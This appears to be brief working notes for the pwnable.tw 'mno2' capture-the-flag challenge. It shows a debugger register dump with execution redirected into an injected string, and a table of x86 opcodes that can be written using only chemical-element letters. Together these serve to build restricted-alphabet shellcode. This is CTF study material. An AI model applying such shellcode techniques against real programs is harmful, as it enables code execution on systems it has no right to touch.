# pwnable.tw-mno2

EAX: 0x324f6e4d ("F5MnO25HoO2PYHoO2CCCSXeKKK", 'N' <repeats 15 times>)

EBX: 0x0

ECX: 0x0

EDX: 0x804889f --> 0x4f004e ('N')

ESI: 0xf7fb7000 --> 0x1b2db0

EDI: 0xf7fb7000 --> 0x1b2db0

EBP: 0xffffd528 --> 0x0

ESP: 0xffffd4ec --> 0x80487ea (<main+169>:      mov    DWORD PTR [esp],0x0)

EIP: 0x324f6e4d ("F5MnO25HoO2PYHoO2CCCSXeKKK", 'N' <repeats 15 times>)

--------------------------------------------------------------------------
1He 			xor [eax+0x65], ecx

1Hf			xor [eax+0x66], ecx

5xxxx			xor eax, 4bytes

0x8048890:      "H"		dec eax

0x804889b:      "B"		inc edx

0x804889d:      "C"		inc ebx

0x804889f:      "N"		dec esi

0x80488a1:      "O"		dec edi

0x80488a3:      "F"		inc esi

0x80488b4:      "P"		push eax

0x80488b6:      "S"		push ebx

0x80488be:      "K"		dec ebx

0x80488c9:      "V"		push edi

0x80488f8:      "Y"		pop ecx

0x8048921:      "I"		dec ecx

0x8048923:      "Xe"		pop eax; gs

0x8048929:      "Ba"		inc edx; popa

0x8048961:      "Re"	push edx; gs

0x804898e:      "Th"		push esp; push 4bytes

0x8048994:      "U"		push ebp

0x80489c0:      "Bh"		inc edx; push 4bytes
